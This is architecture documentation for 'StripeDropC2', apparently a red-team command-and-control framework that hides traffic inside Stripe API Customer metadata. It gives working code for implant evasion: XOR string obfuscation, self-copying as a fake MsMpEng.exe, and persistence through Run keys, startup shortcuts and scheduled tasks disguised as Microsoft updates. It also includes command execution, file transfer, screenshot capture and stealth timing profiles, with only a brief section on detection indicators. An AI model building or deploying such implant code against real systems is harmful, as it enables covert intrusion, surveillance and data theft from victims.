# Architecture Documentation

Technical deep-dive into StripeDropC2's design, implementation, and operational characteristics.

## System Overview

StripeDropC2 is a proof-of-concept Command & Control (C2) framework that abuses Stripe's API infrastructure as a covert communication channel. By masquerading as legitimate payment processing traffic, it evades traditional network monitoring and domain-based blocking.

### Core Concept

Traditional C2 systems use dedicated infrastructure (domains, IPs, servers) that can be identified and blocked. StripeDropC2 leverages **Cloud-Based Data Stores as Communication Channels** - specifically Stripe's Customer object database with its metadata key-value store.

**The Innovation:**
- No custom domains or IPs (all traffic → `api.stripe.com`)
- Legitimate HTTPS encryption (TLS 1.3)
- Trusted infrastructure (Stripe's CDN and cloud)
- Built-in rate limiting (prevents suspicious bursts)
- Global availability (Stripe's worldwide presence)

## Architecture Components

### 1. Operator (Python)

**File:** `c2_operator.py`

**Role:** Command & Control server operated by red team/pentester

**Key Responsibilities:**
- Send commands to implants
- Receive and display results
- Manage file transfers (chunking, reassembly)
- Configure implant behavior remotely
- Track implant heartbeats and status
- Clean up Stripe objects after operations

**Architecture Pattern:** Interactive CLI with synchronous command flow

**Dependencies:**
- `stripe` (Python SDK for Stripe API)
- `c2_config` (configuration module with API key)
- Standard library: `base64`, `time`, `threading`, `os`, `sys`

**Threading Model:**
- Main thread: CLI loop, user input handling
- Worker threads: Parallel deletion during cleanup (25 workers)
- No async/await (keeps code simple, Python 3.8+ compatible)

### 2. Implant (C#)

**File:** `Implant.cs`

**Role:** Agent deployed on target Windows systems

**Key Responsibilities:**
- Maintain heartbeat (periodic check-in)
- Poll for pending commands
- Execute commands via cmd.exe or PowerShell
- Upload/download files via chunked transfers
- Capture screenshots using GDI+
- Establish persistence mechanisms
- Self-relocate to appear legitimate
- Apply dynamic configuration updates

**Architecture Pattern:** Single-threaded async event loop

**Dependencies:**
- .NET 10.0 runtime (or self-contained)
- `System.Net.Http` (for Stripe API calls)
- `System.Text.Json` (for JSON parsing)
- `System.Diagnostics` (for process execution)
- `System.Security.Cryptography` (for MD5 hashing, XOR crypto)

**Compilation:** 
- Top-level statements (no explicit Main method)
- Single-file deployment with trimming
- WinExe subsystem (no console window on startup)
- Conditional compilation for features

### 3. Stripe API (Communication Layer)

**Role:** Cloud-based intermediary, neither operator nor implant

**Used For:**
- Customer objects as message containers
- Metadata fields as data storage (50 fields × 500 chars)
- Search API for fast heartbeat lookup
- Rate limiting (100 req/s test mode)
- HTTPS encryption (handled by Stripe)

**Why Stripe?**
1. **Ubiquity**: Most networks allow Stripe API calls
2. **Trust**: Stripe domains are rarely blocked
3. **Simplicity**: REST API, easy to integrate
4. **Reliability**: 99.99% uptime SLA
5. **Search**: Built-in search for fast object lookup

## Communication Protocol

### Data Flow: Operator → Implant

```
1. Operator creates Customer object:
{
"name": "<implant_id>",
"metadata": {
"tag": "c2-pending",
"cmd": "<base64_encoded_command>",
"implant": "<implant_id>"
}
}

2. Operator updates heartbeat object:
{
"metadata": {
"pending_cmd": "<customer_id_from_step_1>"
}
}

3. Implant polls heartbeat object (every POLL_MIN to POLL_MAX ms)
4. Implant sees pending_cmd in heartbeat metadata
5. Implant fetches Customer object by ID
6. Implant clears pending_cmd (prevents double execution)
7. Implant updates task tag: "c2-pending" → "c2-processing"
8. Implant executes command
9. Implant creates result object with chunked output
```

### Data Flow: Implant → Operator

```
1. Implant chunks result into 490-byte pieces (Stripe metadata limit)
2. Implant creates Customer object per chunk:
{
"name": "<task_id>-result-<chunk_index>",
"metadata": {
"tag": "c2-done",
"idx": "<chunk_index>",
"total": "<total_chunks>",
"r0": "<chunk_data>", // Up to 44 data fields
"r1": "<chunk_data>",
"...",
"r43": "<chunk_data>",
"cwd": "<current_working_directory>",
"implant": "<implant_id>"
}
}

3. Implant updates task tag: "c2-processing" → "c2-done"
4. Operator polls for result chunks
5. Operator reassembles chunks in order
6. Operator displays output
```

### Heartbeat Mechanism

**Purpose:** Track implant liveness and enable instant notifications

**Implementation:**
```
Every HEARTBEAT_MIN to HEARTBEAT_MAX seconds:
1. Implant searches for existing heartbeat object
- Name pattern: "heartbeat-<implant_id>"
- Type: Cached ID if available, search if not

2. If found:
- Update metadata with current timestamp, OS info

3. If not found:
- Create new Customer object with heartbeat metadata:
{
"name": "heartbeat-<implant_id>",
"metadata": {
"type": "heartbeat",
"implant": "<implant_id>",
"hostname": "<computer_name>",
"os": "<os_version>",
"last_seen": "<unix_timestamp>",
"pending_cmd": "" // Used for instant notifications
}
}
```

**Instant Notification Optimization:**
Instead of waiting for next poll cycle, operator can write a pending task ID directly into the heartbeat's `pending_cmd` field. Implant checks this on every poll, enabling fast response even with long poll intervals.

## Data Structures

### Customer Object Metadata Fields

Stripe limits metadata to:
- 50 key-value pairs per object
- 500 characters per value
- Keys must be alphanumeric + underscores

**StripeDropC2 Metadata Schemas:**

**Heartbeat Object:**
```json
{
"type": "heartbeat",
"implant": "DESKTOP-ABC123-a1b2c3d4",
"hostname": "DESKTOP-ABC123",
"os": "Win32NT",
"last_seen": "1717089600",
"pending_cmd": ""
}
```

**Command Object:**
```json
{
"tag": "c2-pending",
"cmd": "d2hvYW1p", // base64: "whoami"
"implant": "DESKTOP-ABC123-a1b2c3d4"
}
```

**Result Object (chunked):**
```json
{
"tag": "c2-done",
"idx": "0",
"total": "3",
"orig_cmd": "ZGlyIEM6XA==", // base64: "dir C:\"
"cwd": "C:\\Users\\Public",
"implant": "DESKTOP-ABC123-a1b2c3d4",
"r0": "Volume in drive C is Windows...",
"r1": " Directory of C:\\ 01/15/2026...",
"...": "...",
"r43": "...5 Dir(s) 123,456,789 bytes free"
}
```

**File Transfer Control:**
```json
{
"tag": "xfer-upload-ctrl",
"implant": "DESKTOP-ABC123-a1b2c3d4",
"dst": "C:\\Users\\Public\\payload.exe",
"hash": "abc123def456...",
"size": "1048576",
"chunks": "21"
}
```

### Chunking Algorithm

**Why Chunking?**
- Stripe metadata value limit: 500 characters
- Command output can be megabytes
- File transfers need reliable segmentation

**Implementation:**
```python
CHUNK_SIZE = 490 # Leave margin for safety
DATA_FIELDS = 44 # r0 through r43 (50 - 6 header fields)

def chunk_data(data: bytes) -> List[Dict]:
"""Split data into Stripe-compatible chunks"""
chunks = []
pos = 0
chunk_idx = 0

while pos < len(data):
chunk = {}
for field_idx in range(DATA_FIELDS):
if pos >= len(data):
break

# Extract CHUNK_SIZE bytes
field_data = data[pos:pos+CHUNK_SIZE]
chunk[f"r{field_idx}"] = field_data.decode('utf-8', errors='ignore')
pos += CHUNK_SIZE

chunk["idx"] = str(chunk_idx)
chunk["total"] = str(total_chunks)
chunks.append(chunk)
chunk_idx += 1

return chunks
```

**Reassembly:**
```python
def reassemble_chunks(chunks: List[Dict]) -> bytes:
"""Reconstruct data from chunks"""
sorted_chunks = sorted(chunks, key=lambda x: int(x["idx"]))
result = b""

for chunk in sorted_chunks:
for i in range(DATA_FIELDS):
field = f"r{i}"
if field in chunk:
result += chunk[field].encode('utf-8')

return result
```

## Security Features

### String Obfuscation

**Problem:** Static analysis tools can extract strings from binaries

**Solution:** XOR encryption at compile time

**Implementation:**
```csharp
static class Crypto
{
// Regenerated per build by regenerate_key.py
private static readonly byte[] Key = new byte[] 
{ 
0xAD, 0xE5, 0x31, ... // 16 random bytes
};

public static string Decrypt(byte[] encrypted)
{
var decrypted = new byte[encrypted.Length];
for (int i = 0; i < encrypted.Length; i++)
decrypted[i] = (byte)(encrypted[i] ^ Key[i % Key.Length]);
return Encoding.UTF8.GetString(decrypted);
}
}

// Usage
static class EncryptedStrings
{
public static readonly byte[] ENC_API_KEY = new byte[] { ... };
public static string API_KEY => Crypto.Decrypt(ENC_API_KEY);
}
```

**Key Regeneration:**
```python
def generate_key(length=16):
return bytes(random.randint(0, 255) for _ in range(length))

def encrypt_string(plaintext, key):
encrypted = bytes(ord(plaintext[i]) ^ key[i % len(key)] 
for i in range(len(plaintext)))
return ", ".join(f"0x{b:02X}" for b in encrypted)
```

**Why This Works:**
- Prevents `strings binary.exe` from revealing sensitive data
- Changes binary signature on every build (defeats hash-based detection)
- Forces dynamic analysis (must run to decrypt)

**Limitations:**
- XOR is weak encryption (easily reversible if key found)
- Key is embedded in binary (static analysis can locate it)
- Defense-in-depth layer, not cryptographic security

### Self-Relocation

**Problem:** Implants launched from Downloads/Desktop look suspicious

**Solution:** Auto-copy to legitimate-looking Windows path

**Implementation:**
```csharp
static bool RelocateSelf()
{
var exePath = Process.GetCurrentProcess().MainModule?.FileName;

// Detect suspicious locations
bool inSuspiciousLocation =
lower.Contains("\\downloads\\") ||
lower.Contains("\\desktop\\") ||
lower.Contains("\\temp\\");

if (!inSuspiciousLocation) return false;

// Target: %APPDATA%\Microsoft\Windows\WinSxS\MsMpEng.exe
string targetDir = Path.Combine(
Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
"Microsoft", "Windows", "WinSxS");

string targetPath = Path.Combine(targetDir, "MsMpEng.exe");

File.Copy(exePath, targetPath, overwrite: true);
Process.Start(targetPath);

return true; // Caller should exit
}
```

**Legitimate-Looking Paths:**
- `%APPDATA%\Microsoft\Windows\WinSxS\` (Windows component store)
- `MsMpEng.exe` (mimics Windows Defender's engine process)

### Persistence Mechanisms

**Registry Run Key:**
```csharp
using var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
@"Software\Microsoft\Windows\CurrentVersion\Run", true);
key.SetValue("WindowsSecurityUpdate", exePath);
```

**Startup Folder Shortcut:**
```csharp
string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
string lnk = Path.Combine(startup, "MicrosoftEdgeUpdate.lnk");

// Create shortcut via PowerShell
powershell.exe -Command "$s=New-Object -C WScript.Shell;
$l=$s.CreateShortcut('{lnk}');
$l.TargetPath='{exePath}';
$l.Save()"
```

**Scheduled Task:**
```csharp
schtasks.exe /Create 
/TN "EdgeUpdateTask" 
/TR "{exePath}" 
/SC DAILY 
/ST 09:00 
/F
```

**Compile-Time Selection:**
```bash
# Enable via -p:DefineConstants
dotnet publish -p:DefineConstants="PERSIST_REGISTRY;PERSIST_STARTUP"
```

## Performance Optimizations

### Parallel Cleanup

**Problem:** Deleting thousands of Stripe objects serially is slow

**Solution:** ThreadPoolExecutor with 25 workers

**Implementation:**
```python
with ThreadPoolExecutor(max_workers=25) as ex:
list(ex.map(stripe.Customer.delete, object_ids))
```

**Why 25 workers?**
- Stripe test mode: 100 req/s limit
- 25 concurrent = ~2500 req/min burst capacity
- Leaves headroom for heartbeats/commands

### Heartbeat Caching

**Problem:** Searching for heartbeat object on every notification is slow

**Solution:** In-memory cache mapping implant_id → customer_id

**Implementation:**
```python
_heartbeat_id_cache = {} # implant_id -> stripe customer id

def _get_heartbeat_id(implant_id):
if implant_id in _heartbeat_id_cache:
return _heartbeat_id_cache[implant_id]

# Search Stripe (fast)
results = stripe.Customer.search(
query=f'name:"heartbeat-{implant_id}"', 
limit=1
)

if results.data:
_heartbeat_id_cache[implant_id] = results.data[0].id
return results.data[0].id
```

**Cache Invalidation:**
- On connection errors (may indicate stale ID)
- Never on success (ID is stable)

### Jittered Timing

**Problem:** Fixed intervals create predictable network patterns

**Solution:** Random jitter within configured range

**Implementation:**
```csharp
static int GetJitteredDelay(int min, int max)
{
return Random.Shared.Next(min, max + 1);
}

// Usage
int pollDelay = GetJitteredDelay(POLL_MIN_MS, POLL_MAX_MS);
await Task.Delay(pollDelay);
```

**Effect:** Even with BALANCED profile (5-15s poll), actual timing varies unpredictably across that range.

## Configuration System

### Compile-Time Configuration

**Mechanism:** Conditional compilation symbols (`#if` directives)

**Stealth Profiles:**
```csharp
#if STEALTH_LOW
const int DEFAULT_POLL_MIN_MS = 2000;
const int DEFAULT_POLL_MAX_MS = 5000;
#elif STEALTH_BALANCED
const int DEFAULT_POLL_MIN_MS = 5000;
const int DEFAULT_POLL_MAX_MS = 15000;
// ... etc
#endif
```

**Build Command:**
```bash
dotnet publish -p:DefineConstants="STEALTH_BALANCED;HIDE_CONSOLE"
```

**Advantages:**
- No config files to secure/exfiltrate
- Smaller binary (unused code eliminated)
- Harder to modify behavior post-deployment

### Runtime Configuration

**Mechanism:** Operator updates config object on Stripe, implant reads on next poll

**Config Object Structure:**
```json
{
"name": "config-<implant_id>",
"metadata": {
"type": "config",
"implant": "<implant_id>",
"poll_min": "10000",
"poll_max": "30000",
"heartbeat_min": "60",
"heartbeat_max": "120"
}
}
```

**Implant Applies Config:**
```csharp
#if ALLOW_DYNAMIC_CONFIG
void ApplyDynamicConfig(Dictionary<string, string> hbMeta)
{
if (int.TryParse(hbMeta.GetValueOrDefault("poll_min"), out int pMin))
POLL_MIN_MS = pMin;

if (int.TryParse(hbMeta.GetValueOrDefault("poll_max"), out int pMax))
POLL_MAX_MS = pMax;

// ... heartbeat intervals too
}
#endif
```

**Use Cases:**
- Slow down when detection risk increases
- Speed up for time-sensitive operations
- Adjust based on network behavior observations

## Screenshot Implementation

**Technology:** Windows GDI+ (Graphics Device Interface Plus)

**Process:**
1. Get desktop device context
2. Create compatible bitmap
3. BitBlt to copy screen pixels
4. Convert bitmap to JPEG via GDI+ encoders
5. Base64 encode for transfer
6. Chunk and send via Stripe

**Code Flow:**
```csharp
// Get screen dimensions
int width = GetSystemMetrics(SM_CXSCREEN);
int height = GetSystemMetrics(SM_CYSCREEN);

// Capture desktop
IntPtr hdcSrc = GetDC(IntPtr.Zero);
IntPtr hdcDst = CreateCompatibleDC(hdcSrc);
IntPtr hBitmap = CreateCompatibleBitmap(hdcSrc, width, height);
SelectObject(hdcDst, hBitmap);
BitBlt(hdcDst, 0, 0, width, height, hdcSrc, 0, 0, SRCCOPY);

// Convert to managed Bitmap
Bitmap bmp = Bitmap.FromHbitmap(hBitmap);

// Encode as JPEG
var jpegEncoder = GetEncoder(ImageFormat.Jpeg);
var encoderParams = new EncoderParameters(1);
encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, 85L);

using var ms = new MemoryStream();
bmp.Save(ms, jpegEncoder, encoderParams);
byte[] jpegBytes = ms.ToArray();

// Base64 encode and transfer
string b64 = Convert.ToBase64String(jpegBytes);
return Encoding.UTF8.GetBytes("[RAW_IMAGE_DATA]\n" + b64);
```

**Multi-Monitor Support:**
```csharp
// Use virtual screen dimensions
int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
```

## Detection Considerations

### Network Indicators

**Detectable Patterns:**
- High-frequency HTTPS to `api.stripe.com`
- User-Agent: `.NET HttpClient`
- Requests from non-financial processes
- Regular heartbeat timing (even with jitter)
- Large metadata operations

**Mitigation Strategies:**
- Use PARANOID profile in monitored environments
- Blend with legitimate Stripe traffic if organization uses Stripe
- Consider user-agent randomization (not currently implemented)
- Vary heartbeat intervals significantly

### Host Indicators

**Detectable Artifacts:**
- Binary named `stripe.exe` or `MsMpEng.exe`
- Persistence registry keys/shortcuts
- Network connections to Stripe from unusual processes
- GDI+ screenshot API calls
- Self-copied binaries in AppData

**Defensive Recommendations:**
- Monitor for Stripe API calls from non-approved processes
- Alert on persistence mechanism creation (Run keys, tasks)
- Track executables making payment API calls
- Memory forensics to detect XOR-decrypted strings

### Behavioral Indicators

**Unusual Behaviors:**
- Payment API calls from non-financial software
- Regular Customer object creation patterns
- Metadata-heavy operations
- Atypical Stripe dashboard activity (Customer churn)

## Limitations & Trade-offs

### Technical Limitations

1. **Metadata Size**: 500 chars/value = chunking overhead
2. **Rate Limits**: 100 req/s (test mode) caps throughput
3. **Latency**: Cloud API calls slower than direct sockets
4. **Auditing**: Stripe logs all API activity (OpSec risk in live mode)

### Operational Trade-offs

1. **Speed vs Stealth**: Fast polling = higher detection risk
2. **Reliability vs Noise**: Frequent heartbeats = more traffic
3. **Complexity vs Simplicity**: Chunking adds reassembly logic
4. **Cost**: Live mode creates actual financial records

### Design Decisions

**Why Stripe over other cloud APIs?**
- Ubiquity (most orgs allow Stripe traffic)
- Search capability (fast heartbeat lookup)
- Liberal test mode (no credit card, no costs)
- Simple REST API (easy integration)

**Why Customer objects?**
- Metadata KV store (50 fields × 500 chars)
- Search API support (name/metadata queries)
- No automatic expiration
- Easy cleanup via bulk delete

**Why .NET 10.0?**
- Modern C# features (top-level statements, records)
- Excellent trimming (smaller binaries)
- Native JSON support (no external deps)
- Single-file deployment

## Performance Metrics

**Typical Performance:**

| Metric | Value | Notes |
|--------|-------|-------|
| Heartbeat Interval | 25-35s | BALANCED profile |
| Command Latency | 5-15s | Time to execute |
| Screenshot Capture | 2-5s | 1920x1080 display |
| Screenshot Transfer | 10-30s | ~150 KB JPEG |
| File Upload (1 MB) | 30-60s | Network dependent |
| Implant Binary Size | 15-25 MB | Self-contained, trimmed |
| Memory Footprint | 20-40 MB | Runtime typical |

**Scalability:**
- Single operator can manage 10-50 implants easily
- Rate limit: ~100 concurrent operations/second
- Cleanup: 1000 objects in ~10 seconds (parallel)

## Future Enhancements

**Potential Improvements:**
1. Multi-implant broadcasting (send command to all)
2. Proxy support (operator-side SOCKS/HTTP)
3. Alternate cloud backends (AWS, Azure, GCP)
4. End-to-end encryption (beyond XOR obfuscation)
5. Plugin system for custom commands
6. Web-based operator UI (alternative to CLI)
7. Cross-platform implants (Linux, macOS via .NET)
8. Advanced anti-forensics (memory zeroing, secure deletion)

## References

**Academic Research:**
- Covert Channels in Cloud APIs (Various papers)
- C2 Infrastructure Design (Red Team literature)
- Malware Communication Techniques (MITRE ATT&CK)

**API Documentation:**
- Stripe API Reference: https://stripe.com/docs/api
- .NET HttpClient: https://docs.microsoft.com/en-us/dotnet/api/system.net.http.httpclient

**Security Frameworks:**
- MITRE ATT&CK: https://attack.mitre.org/
- NIST Cybersecurity Framework

---

**This architecture enables covert C2 through creative abuse of legitimate cloud infrastructure.**
